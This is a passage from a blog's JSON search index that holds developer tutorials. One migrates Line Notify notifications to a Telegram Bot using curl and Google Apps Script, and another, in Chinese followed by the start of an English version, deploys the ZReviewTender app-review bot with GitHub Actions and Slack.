\"height\": 320 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANjAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQB\", \"file_size\": 37988, \"width\": 640, \"height\": 640 } ] } } ]}You can find the corresponding Group Name + type=group nested JSON data in the response, where the id is the Group Chat ID:\"chat\": { \"id\": -4532420331, \"title\": \"My Notify\", \"type\": \"group\", \"all_members_are_administrators\": false} Group Chat Id = -4532420331 ⚠️⚠️⚠️️ If your response is empty { \"ok\": true, \"result\": [] }, please try sending a message in your Group (e.g., Hello) and then call the API again; it should work.Step 4. Send a MessageWe can use /sendMessage to send a message to the Group.Request:curl 'https://api.telegram.org/botYOUR_BOT_API_Token/sendMessage' \\--form 'chat_id=\"Group Chat Id\"' \\--form 'text=\"Message content\"'Example:curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/sendMessage' \\--form 'chat_id=\"-4532420331\"' \\--form 'text=\"test\"' API parameters can be referenced in the official documentationResponse &amp; Result:{ \"ok\": true, \"result\": { \"message_id\": 5, \"from\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Notify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728727847, \"text\": \"test\" }} Successfully sent, receiving the above response. The message content just sent will appear in the Telegram Group.(2/2) Migrating Line Notify Messages to Telegram Bot (Google Apps Script)My personal notification bot service is achieved using Google Apps Script, so I will use Google Apps Script for the conversion example (similar to JavaScript).Original Line Notify Sending Code:const lineToken = \"XXXX\";function sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}As you can see, it is very simple and convenient to use…Migrating to Telegram Bot Sending Code:const telegramToken = \"YOUR_BOT_API_Token\";const TelegramChatId = { GA: -123456, GITHUB: -123457, MEDIUM: -123458};function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}Using the information obtained from the previous Telegram Bot setup steps: telegramToken = YOUR_BOT_API_Token TelegramChatId is a structure I defined myself because, in practice, I want different notifications to be sent to different Groups, so I defined a structure to manage the target Groups and their Group Chat Id./sendMessage [**API parameters, for more parameters and details, please refer to the official documentation**](https://core.telegram.org/bots/api#sendmessage){:target=\"_blank\"} Here are the parameters I personally use:- text: Message content \\(required\\)- chat\\_id: Target Group Chat Id \\(required\\)- parse\\_mode: Message content parsing method, here I specify `Markdown`- disable\\_web\\_page\\_preview: Whether to disable link previews in the message content, set to `true` to turn it off for a cleaner message display.**Usage:**```scsssendNotifyMessage(\"Hello\", TelegramChatId.MEDIUM) // Send Hello message to MEDIUM Group Chat IdsendNotifyMessage(\"Hello\", -1234) // Send Hello message to -1234 Group Chat IdResultsTaking my Github Repo Star Notifier Bot as an example: Verification successful! When someone stars my Repo, notifications are correctly sent to the Telegram Group! 🎉🎉🎉 For the creation process, you can refer to my previous article “Create a Github Repo Star Notifier for Free in Three Steps Using Google Apps Script”Setting Special Sounds or MuteWhat’s even better than Line Notify is that we can set different notification sounds or mute for different Groups.Interacting with Telegram Bot (Command) x Using Google Apps ScriptIn addition to replacing the Notify function, the Telegram Bot can easily implement user interaction features — Telegram Bot Commands.Returning to my use case, my bot sends notification messages to me at scheduled times or triggered by Webhooks; however, sometimes I want to manually trigger the bot to get the current results immediately. Previously, Line Notify did not have this feature, and with Google Apps Script, I could only set a URL that would trigger the action when opened, which was not very user-friendly.Telegram Bot Commands allow me to directly input command messages, instructing the bot to execute what I want immediately. This article uses Google Apps Script as an example. For a detailed introduction to Google Apps Script, you can refer to my previous article “Implementing Google Service RPA Automation with Google Apps Script“.Step 1. Implement Command Handling Logic Using Google Apps Script Go to the Google Apps Script homepage Click “Create New Project” in the top left Click on “Untitled Project” to enter the project name e.g. Telegram Paste the basic code:const telegramToken = \"your_BOT_API_Token\";function doPost(e) { const content = JSON.parse(e.postData.contents); if (content.message &amp;&amp; content.message.text) { const command = content.message.text.split(' ')[0]; const chatId = content.message.chat.id; if (command.startsWith(\"/update\")) { // Received /update command // Handle what you want to do here... then respond... sendNotifyMessage(\"Hello.....\\nCommand:\"+command, chatId); } } return HtmlService.createHtmlOutput(\"OK!\");}function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());} telegramToken = your_BOT_API_Token In the above demo code, when we receive a Post request and the Command parameter equals /update, we respond with Hello… simulating the scenario of processing after receiving the command.Step 2. Complete Google Apps Script Web Deployment Click “Deploy” in the top right -&gt; “New Deployment” In the top left, click “Settings” -&gt; “Web App” For who can access, select “Anyone” Add a deployment task, select “Grant Access” A window will pop up for account selection, choose your Google login account A warning window will pop up, select “Advanced” -&gt; “Go to Project Name (unsafe)” Select “Allow” Web app URL: your Webhook URL . Copy it.e.g. https://script.google.com/macros/s/AKfycbx2oFv-eB4LezdOk3P3aoEZVhx_PI6n_YnTNP7WVVQSaiRU52di5bKNThsvIZxus3Si/exec For Google Apps Script web app deployment, updates, usage, and debugging, you can refer to my previous article “Implementing Google Service RPA Automation with Google Apps Script“. ⚠️⚠️⚠️ Please note, if there are changes to the Google Apps Script code, you must click Deploy -&gt; Manage Deployments -&gt; Select Create New Version for it to take effect. For details, please refer to the article above. ⚠️⚠️⚠️ Please note, if there are changes to the Google Apps Script code, you must click Deploy -&gt; Manage Deployments -&gt; Select Create New Version for it to take effect. For details, please refer to the article above. ⚠️⚠️⚠️ Please note, if there are changes to the Google Apps Script code, you must click Deploy -&gt; Manage Deployments -&gt; Select Create New Version for it to take effect. For details, please refer to the article above.Step 3. Register WebhookUse the Telegram API /setWebhook to register your Webhook URL.Request:curl --location 'https://api.telegram.org/your_BOT_API_Token/setWebhook' \\--form 'url=\"your Webhook URL\"'Response:{ \"ok\": true, \"result\": true, \"description\": \"Webhook was set\"}Testing We will respond based on different Chat Ids, so whether it’s a 1:1 interaction with the bot or in a Group where the bot is present, we can respond. Success 🎉🎉🎉Next Article: Simple 3 Steps — Create a Free GA4 Automatic Data Notification BotOther Google Apps Script Automation Articles Implementing Google Service RPA Automation with Google Apps Script Slack &amp; ChatGPT Integration Create a Github Repo Star Notifier for Free in Three Steps Using Google Apps ScriptNoteThis article is also my 100th post on Medium (first published in October 2018 here, it’s been 6 years). I will continue to work hard and share detailed insights and data once I reach 1000 Followers (currently 925 as of October 2024) or a total view count of over 1,000,000 (currently 984,549 as of October 2024).If you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 7,876 Total Views Last Statistics Date: 2025-08-15 | 7,100 Views on Medium." }, { "title": "Quick Start! Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人", "url": "/posts/zrealm-robotic-process-automation/quick-start-github-action-x-zreviewtender-%E5%85%8D%E8%B2%BB%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E4%BD%A0%E7%9A%84-app-%E5%95%86%E5%9F%8E%E8%A9%95%E5%83%B9%E7%9B%A3%E6%8E%A7%E6%A9%9F%E5%99%A8%E4%BA%BA-0095528cf875/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, app-review, app-store, google-play, android", "date": "2024-09-26 20:42:21 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[Quick Start! ] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人簡單三步驟為您建立免費穩定安全的 App 評價機器人，即時關注使用者的最新評價。ZRevi...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[Quick Start! ] Github Action x ZReviewTender 免費快速部署你的 App 商城評價監控機器人簡單三步驟為您建立免費穩定安全的 App 評價機器人，即時關注使用者的最新評價。ZReviewTender [English Version] : [Quick Start! ] Github Action x ZReviewTender Free and Fast Deployment of Your App Store Review Monitoring BotZReviewTenderZReviewTender — 是我在 2022/08 製作開源的 App 商城評價機器人，功能是會自動撈取 iOS App Store, Android Google Play 商城上的 App 使用者評價並轉發到指定的 Slack Channel。另外可以指定評價撈取規則、串接 Google 翻譯、Asana、Google Sheet，也支援自訂義客製化操作。Github ActionGithub Action 是由 Github 提供的 CI/CD 自動化集成工具，我們可以使用自己的機器做為伺服器 (Github Runner)亦或是直接使用 Github 提供的機器執行 CI/CD、自動化腳本。費用及限制 使用自己的機器 (Github Runner):無特別費用，只有最高執行數、並行上限、部分 API 短期最大請求數量限制。 使用 Github 提供的機器:GitHub Free 提供基本 500 MB Storage (for CI/CD Artifact)、2,000 Minutes 一個月執行分鐘數。這邊要注意的是因為機器成本問題： 如果使用 Github 的 Windows 機器，消耗的分鐘數等於實際分鐘數 x 2 如果使用 Github 的 macOS 機器，消耗的分鐘數等於實際分鐘數 x 10詳細計價計算請參考 官方價格計算器 。 ZReviewTender Minutes per month 消耗：約 120 分鐘 只需要跑在基礎計價的 Linux 上，每次執行約消耗 ≤ 1 分鐘，預設每 6 小時執行一次，一天花費 4 分鐘，一個月約消耗 120 分鐘，免費額度就很足夠了。 ZReviewTender Storage 消耗：0 無使用 Artifact 儲存資料，因此沒有 Storage 的開銷。Slack公司使用的內部通訊軟體，會建立一個 Slack App 並透過這個 Slack App 身份轉發 App 商城評價通知到指定的頻道。ZReviewTender x Github Action x Slack 我們使用 Github Action 來執行 ZReviewTender 腳本轉發結果到 Slack，Github Repo(Action) 只是當載體使用，因此就算您的主專案不使用 Github 託管，依然可以簡單照以下步驟完成 ZReviewTender 部署。🎉🎉🎉 我已經成功部署在 5 個不同公司的不同 Apps 並穩定、免費執行了至少 2 年以上。優點： 免費 ： ZReviewTender 是我製作的開源免費服務、部署在 Github Action 使用免費額度綽綽有餘。 您不需要在每個月花錢買 App Review Bot 之類的月費評價機器人服務。 安全 ：撈取評價用的憑證、金鑰均安全存放在你的 Github Private Repo，除了你之外沒有人有權限存取。您不需要再冒著洩漏風險把重要的憑證、金鑰上傳給第三方服務使用； ZReviewTender 為開源專案，一切操作經的起大眾檢視。 可靠 ： ZReviewTender 使用官方最新提供的 API 撈取評價資訊，相較以往其他服務使用 RSS 撈取評價，更準確、穩定可靠。Buy me coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli 如果這個專案有幫助到您，歡迎贊助我一杯咖啡，謝謝。Quick Start!🚀 整個設定步驟約需 30 分鐘，但只需設定一次，除非憑證金鑰有更換，不然可以永久免費穩定的運作。 🚀🚀🚀🚀🚀Step 1. 建立 Slack App如果您的組織內已有建立過有 chat:write 之類的發訊息權限 Slack App，可以直接復用，不用建立新的。前往 Slack Apps 首頁：https://api.slack.com/apps點擊右上角「Create New App」。 選擇：From scratch 輸入 App Name： ZReviewTender 或自定義 Slack App 名稱 選擇目標安裝的 Slack Workspace：請確認你選擇的 Workspace，你有新增 Slack App 的權限。 Create App新增 OAuth &amp; Permissions Scopes： Slack app 建立完成後，先到「OAuth &amp; Permissions」頁籤設定 Scopes。 選擇「OAuth &amp; Permissions」 下滑找到 Scopes Section 依序輸入新增 ZReviewTender Slack App 必備的三個 Scopes：chat:writechat:write.publiclinks:writeInstall App 回到 Install App 頁籤安裝 Slack App 到 Workspace。 選擇「Install App」 點擊「Install to YOUR_WORKSPACE 」 點擊「Allow」安裝完成後回到 Install App 頁面就會出現 Slack App Bot User OAuth Token ，點擊「Copy」複製， 記下來，稍後設定使用 。建立預收到評價通知的頻道： Sidebar -&gt; Channels -&gt; Create -&gt; Create channel Name: 輸入想要的頻道名稱Visibility： Public：對所有人公開，無需其他動作。 Private：私密頻道， ⭐️⭐️⭐️ 需要把剛剛建立的 Slack App 加入：Slack App 加入頻道方式： 點擊上方 #頻道名稱 點擊「Settings」 點擊「Add an App」 搜尋你剛建立的 Slack App 名稱 點擊「Add」加入成功頻道會有提示字詞。 ZReviewTender joined. ⭐️⭐️⭐️這邊有發現一個 Slack Bug，Slack App 剛建立完可能會搜尋不到，要等一陣子才會出現；可以先使用 Public Channel，Public Channel 不需要將 Slack App 加入就能使用。取得 Channel ID: 最後一步，最重要的我們要取得 Channel ID 稍後設定要使用。 點擊上方 #頻道名稱 About 最下方有一個 Channed ID 資訊 記下 Channel ID ，稍後設定使用 Slack 步驟完成。— — —其他補充：你可以在「Basic Information」-&gt;「Display Information」編輯 Slack App 名稱、icon：修改完成後記得點右下角「Save Changes」才會儲存。如果 OAuth &amp; Permissions Scopes 有新增需要點擊「reinstall your app」重新安裝才會生效：Step 2. 產生 Apple App Store Connect API &amp; Google Play Android Developer API 身份憑證Apple App Store Connect API 身份憑證iOS 比較容易，我們只需要從 App Store Connect 得到以下四個資訊即可：Issuer ID： App Store Connect -&gt; Keys -&gt; App Store Connect API 記下 Issuer ID ，稍後設定使用Private Key ID &amp; Private Key：點擊「+」新增按鈕： Name: ZReviewTender Access: App Manager Key ID ，稍後設定使用 點擊「Download API Key」保存下載下來的「 AuthKey_XXXXXXXXXX.p8 」檔案，稍後設定使用。App ID : (要撈取評價的目標 App ID)App ID 可以在 App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; App ID 找到。 記下 App ID ，稍後設定使用Google Play Android Developer API 身份憑證Android 較為複雜，需要先從 App 專案所屬的 Google Cloud Project 啟用 API &amp; 建立 Service Account (服務帳戶) &amp; 將服務帳戶加入 Google Play Console 並賦予 App 權限。前往 Google Cloud Project：選擇 App 專案所屬的 Google Cloud Project 或建立一個新 Project。啟用「Android Developer API」： 搜尋「Android Developer API」點擊進入 選擇「啟用」[此步驟可選] 您也可以同時啟用「Cloud Translation API」： 啟用後可以使用同一個 Service Account (服務帳戶) 憑證，串接評價自動翻譯功能 請注意：Cloud Translation API 並非免費，偵測語言、翻譯都會產生費用！ 請注意：Cloud Translation API 並非免費，偵測語言、翻譯都會產生費用！ 請注意：Cloud Translation API 並非免費，偵測語言、翻譯都會產生費用！建立 Service Account (服務帳戶)： 搜尋「IAM」 選擇「IAM &amp; Admin」 選擇「服務帳戶 (Service Account)」 選擇「建立服務帳戶 (Service Account)」 服務帳戶名稱：自行輸入，可輸入「 ZReviewTender 」or「 Google Play Review Bot 」 服務帳戶 ID：自動帶入，沒特殊需求不用變更，這同時也會是你的 Service Account Email 點擊「完成」記下這組服務帳戶 Service Account 的信箱地址： 列表頁也會顯示 Service Account Email 地址 記下 Service Account Email ，稍後設定使用建立服務帳號 Service Account 金鑰憑證： 重整列表頁面，點擊進入剛剛創建的 服務帳號 Service Account 點擊「新增金鑰」 點擊「建立新的金鑰」 金鑰類型選擇「JSON」 點擊「建立」 保存下載下來的「 XXXX-XXXX.json 」檔案，稍後設定使用將服務帳戶加入 Google Play Console 並賦予 要撈取評價的目標 App 權限：進入到 Google Play Console 後台： 點擊「Users and permissions」 點擊右方「Invite new users」 Email address 輸入剛剛記下來的 Service Account Email App permissions -&gt; Add app 加入 要撈取評價的目標 App 點擊「Invite user」 即可完成邀請，無需驗證取得 Google Play Console Developer ID &amp; App ID &amp; Package Name 資訊： 點擊 要撈取評價的目標 App 進入 Dashboard 記下 Package Name ，稍後設定使用複製 Dashboard 網址，從網址中找到：3.其中 /developers/ XXX 就是你的 Developer ID ，記下這串數字 Developer ID，稍後設定使用4.其中 /app/ XXX 就是你的 App ID ，記下這串數字 App ID，稍後設定使用 身份憑證設定完成。Step 3. Github Action 部署、設定檔填寫令人振奮的事是，我已經將繁瑣的 Github Repo, Github Action 設定流程打包成 Repo Template &amp; Marketplace Github Action，您只要照以下幾個步驟就可以完成工作。前往： ZReviewTender-deploy-with-github-action ：https://github.com/ZhgChgLi/ZReviewTender-deploy-with-github-action Repository name：輸入你想要的 Repo 名稱 Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ 點擊「Create repository」 ZReviewTender 作者、貢獻者、ZhgChgLi 並不會因為您使用 ZReviewTender 造成的任何損失負責。等待 Repository 建立：再次確認建立的是 Private Repo： Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️ Private ：因 Repo 會存放存取金鑰， 務必設定為 Private Repo ⭐️⭐️⭐️啟用 Github Actions 權限： Repo 建立完成後，因 Github 安全設定，要先去 Repo Settings 允許 Github Actions 執行。 Repo -&gt; Settings 選擇「Actions」 -&gt; 「General」 Actions permissions 選擇「Allow all actions and reusable workflows」 點擊「Save」 Workflow permissions 選擇「Read repository contents and packages permissions」首次執行，初始化 ZReviewTender： Repo -&gt; Actions 選擇「Init ZReviewTender」 選擇「Run workflow」 點擊「Run workflow」 重整頁面等待 init ZReviewTender Action 完成： 如果出現 ❌ Error：請重新檢查前面提到的 Github Actions 權限設定是否正確。初始化成功回到 Repo 首頁會出現兩個新目錄：上傳所需的憑證檔案： 進入 /config 目錄 右上角「Add file」-&gt; 「Upload files」 將 Step 2. 保存下來的 GCP Service Account XXXX-XXXX.json (for Android)與 App Store Connect 保存下來的 AuthKey_XXXXXXXXXX.p8 (for iOS)一同上傳。 等待上傳完成 選擇「Commit directly to the main branch」 點擊「Commit changes」設定 Apple (iOS)： 進入 config/ 目錄，點擊 apple.yml 檔案 點擊右上角「🖊️編輯」編輯 apple.yml ，貼上以下內容並填入前幾步記下來的資訊：platform: 'apple'appStoreConnectP8PrivateKeyFilePath: './config/AuthKey_XXXXXXXXXX.p8' # APPLE STORE CONNECT API PRIVATE .p8 KEY File PathappStoreConnectP8PrivateKeyID: 'Private Key ID' # APPLE STORE CONNECT API PRIVATE KEY IDappStoreConnectIssueID: 'Issuer ID' # APPLE STORE CONNECT ISSUE IDappID: 'App ID' # APP IDprocessors: - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated. appStoreConnectP8PrivateKeyFilePath : 輸入 ./config/AuthKey_XXXXXXXXXX.p8 (Step 2. App Store Connect 保存下來的 AuthKey_XXXXXXXXXX.p8 檔案名稱) appStoreConnectP8PrivateKeyID : Step 2. App Store Connect 記下來的 Private Key ID appStoreConnectIssueID : Step 2. App Store Connect 記下來的 Issuer ID appID : Step 2. App Store Connect 記下來的目標撈取 App 的 App ID slackBotToken : 輸入 Step 1. 記下的 Slack App Bot User OAuth Token slackBotTargetChannel : 輸入 Step 1. 記下的 要傳送到的 Channel ID 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」設定 Android： 進入 config/ 目錄，點擊 android.yml 檔案 點擊右上角「🖊️編輯」編輯 android.yml ，貼上以下內容並填入前幾步記下來的資訊：platform: 'android'packageName: 'Package Name' # Android App Package NamekeyFilePath: './config/XXXX-XXXX.json' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: 'Developer ID' # Google Console Developer Account IDplayConsoleAppID: 'App ID' # Google Console App IDprocessors:- SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"Slack App Bot User OAuth Token\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"Target Channel ID\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated. packageName : Step 2. Google Play Console 後台記下來的 Package Name keyFilePath : 輸入 ./config/XXXX-XXXX.json (Step 2. GCP IAM 保存下來的 XXXX-XXXX.json Service Account 金鑰檔案名稱) playConsoleDeveloperAccountID : Step 2. Google Play Console 後台記下來的 Developer ID playConsoleAppID : Step 2. Google Play Console 後台記下來的 App ID slackBotToken : 輸入 Step 1. 記下的 Slack App Bot User OAuth Token slackBotTargetChannel : 輸入 Step 1. 記下的 要傳送到的 Channel ID 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」 設定完成！ 🚀🚀🚀🚀驗證設定是否成功：我們可以手動執行一次，確認設定無誤。 Repo -&gt; Actions 選擇「ZReviewTender」 選擇「Run workflow」 點擊「Run workflow」 重整頁面等待 ReviewTender Action 完成：驗證成功🎉🎉🎉🎉 如果出現 ❌ Error、Slack Channel 未收到啟動訊息：請重新檢查前面設定檔案內容是否正確。完成 🎉🎉🎉現在你可以依靠這個免費可靠的 App 評價機器人時刻關注使用者的最新評價了！Buy me coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli 如果這個專案有幫助到您，歡迎贊助我一杯咖啡，謝謝。其他設定加上過濾功能只轉發符合條件的評價。 - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) 您只要在 /config/apple.yml 或 /config/android.yml 的 processors 區塊加上 FilterProcessor 設定。加上自動翻譯功能將非您語言的評價自動使用 Google Cloud Translation API 進行翻譯 (需消耗費用)。 請先確定 Step 2. 建立的 Service Account 所屬 GCP Project 有啟用「Cloud Translation API」 apple.yml 與 android.yml 設定有一些不同apple.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"TWN\",\"CHN\"] # Review origin Territory that you don't want to translate. (territory for Apple e.g. TWN) ./config/XXXX-XXXX.json (Step 2. GCP IAM 保存下來的 XXXX-XXXX.json Service Account 金鑰檔案名稱)android.yml: - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: './config/XXXX-XXXX.json' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) ./config/XXXX-XXXX.json (Step 2. GCP IAM 保存下來的 XXXX-XXXX.json Service Account 金鑰檔案名稱)完整組合範例：platform: 'android'packageName: '' # Android App Package NamekeyFilePath: '' # Google Android Publisher API Service Account Credential .json File PathplayConsoleDeveloperAccountID: '' # Google Console Developer Account IDplayConsoleAppID: '' # Google Console App IDprocessors: - FilterProcessor: class: \"FilterProcessor\" enable: true # enable keywordsInclude: [] # keywords you want to filter out ratingsInclude: [] # ratings you want to filter out territoriesInclude: [] # territories you want to filter out (territory for Apple e.g. TWN) - GoogleTranslateProcessor: # Google Translate Processor, will translate review text to your language, you can remove whole block if you don't needed it. class: \"GoogleTranslateProcessor\" enable: true # enable googleTranslateAPIKeyFilePath: '' # Google Translate API Service Account Credential .json File Path googleTranslateTargetLang: 'zh-TW' # Translate to what Language googleTranslateTerritoriesExclude: [\"zh-Hant\",\"zh-Hans\"] # Review origin Territory (language) that you don't want to translate. (language for android e.g. zh-Hant, en) - SlackProcessor: # Slack Processor, resend App Review to Slack. class: \"SlackProcessor\" enable: true # enable slackTimeZoneOffset: \"+08:00\" # Review Created Date TimeZone slackAttachmentGroupByNumber: \"1\" # 1~100, how many review message in 1 slack message. slackBotToken: \"\" # Slack Bot Token, send slack message throught Slack Bot. slackBotTargetChannel: \"\" # Slack Bot Token, send slack message throught Slack Bot. (recommended, first priority) slackInCommingWebHookURL: \"\" # Slack In-Comming WebHook URL, Send slack message throught In-Comming WebHook, not recommended, deprecated.調整完畢一樣照以下步驟儲存 .yml ： 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」執行參數設定您可以編輯 ZReviewTender.yml 檔案設定執行參數。 Repo -&gt; Actions 點擊「ZReviewTender」 點擊「 ZReviewTender.yml 」 點擊右上角「🖊️編輯」name: ZReviewTenderon: workflow_dispatch: schedule: - cron: \"15 */6 * * *\" #check new review every 6 hour.jobs: ZReviewTender: runs-on: ubuntu-latest steps: - name: ZReviewTender Automatic Bot uses: ZhgChgLi/ZReviewTender@main with: command: '-r'調整檢查頻率 (多久爬取轉發一次新評價?)調整 cron: \"15 */6 * * *\" 裡的設定值。參數使用 Crontab 表示，您可以使用 以下網站 產生想要的設定參數：https://crontab.guru/調整執行腳本調整 command: \"-r\" 裡的設定值。 -r : 同時執行 Android 和 Apple (iOS) 評價檢查 -a : 紙執行 Apple (iOS) 評價檢查 -g : 只執行 Android 評價檢查調整完畢： 編輯完成後點擊右上角「Commit changes…」 選擇「Commit directly to the main branch」 點擊「Commit changes」暫時停止檢查 Repo -&gt; Actions 選擇「ZReviewTender」 點擊右方「…」 選擇「Disable workflw」問題回報及功能建議如果您有任何功能建議或問題、Bug，請前往以上 Github Repo 建立 Issue 回報，謝謝。進階使用及開發故事 ZReviewTender — 免費開源的 App Reviews 監控機器人 App Store Connect API 現已支援 讀取和管理 Customer Reviews ZReviewsBot — Slack App Review 通知機器人 AppStore APP’s Reviews Slack Bot 那些事有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 232 Total Views Last Statistics Date: 2025-08-15 | 143 Views on Medium." }, { "title": "Quick Start! Deploy Your App Store Review Monitoring Bot for Free with Github Action x ZReviewTender", "url": "/posts/zrealm-robotic-process-automation/en/quick-start-deploy-your-app-store-review-monitoring-bot-for-free-with-github-action-x-zreviewtender-0095528cf875/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, app-review, app-store, google-play, android", "date": "2024-09-26 20:42:21 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Quick Start! ] Deploy Your App Store Review Monitoring Bot for Free with Github Act...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Quick Start! ] Deploy Your App Store Review Monitoring Bot for Free with Github Action x ZReviewTenderIn just three simple steps, you can create a free, stable, and secure App review bot that keeps you updated on the latest user reviews.ZReviewTender [English Version] : [Quick Start! ] Github Action x ZReviewTender Free and Fast Deployment of Your App Store Review Monitoring BotZReviewTenderZReviewTender is an open-source App review bot I created in August 2022. It automatically fetches user reviews from the iOS App Store and Android Google Play Store and forwards them to a specified Slack channel.Additionally, you can set review fetching rules, integrate with Google Translate, Asana, Google Sheets, and customize operations.Github ActionGithub Action is a CI/CD automation integration tool provided by Github. You can use your own machine as a server (Github Runner) or directly use the machines provided by Github to run CI/CD and automation scripts.Costs and Limitations Using your own machine (Github Runner):No special costs, only limits on maximum execution counts, concurrency limits, and some API short-term maximum request limits. Using Github’s provided machines:GitHub Free provides a basic 500 MB Storage (for CI/CD Artifacts) and 2,000 minutes of execution time per month.Please note due to machine cost issues: If using Github’s Windows machines, the consumed minutes equal actual minutes x 2. If using Github’s macOS machines, the consumed minutes equal actual minutes x 10.For detailed pricing calculations, please refer to the official pricing calculator. ZReviewTender Estimated monthly minutes consumed: about 120 minutes It only needs to run on a basic pricing Linux machine, consuming about ≤ 1 minute per execution. By default, it runs every 6 hours, spending 4 minutes a day, totaling about 120 minutes a month, which is well within the free quota. ZReviewTender Storage consumption: 0 No artifacts are stored, so there are no storage costs.SlackThe internal communication tool used by the company. A Slack App will be created to forward App Store review notifications to a specified channel.ZReviewTender x Github Action x Slack We use Github Action to execute the ZReviewTender script and forward the results to Slack. The Github Repo (Action) is just a carrier, so even if your main project is not hosted on Github, you can still easily complete the ZReviewTender deployment by following the steps below. 🎉🎉🎉 I have successfully deployed it for 5 different companies’ apps and it has been running stably and for free for over 2 years.Advantages: Free: ZReviewTender is an open-source free service I created, deployed on Github Action with ample free quota. You won’t need to spend money each month on subscription-based App Review Bot services. Secure: The credentials and keys used to fetch reviews are securely stored in your Github Private Repo, and no one else has access. You won’t have to risk leaking important credentials and keys by uploading them to third-party services; ZReviewTender is an open-source project, and all operations can be publicly reviewed. Reliable: ZReviewTender 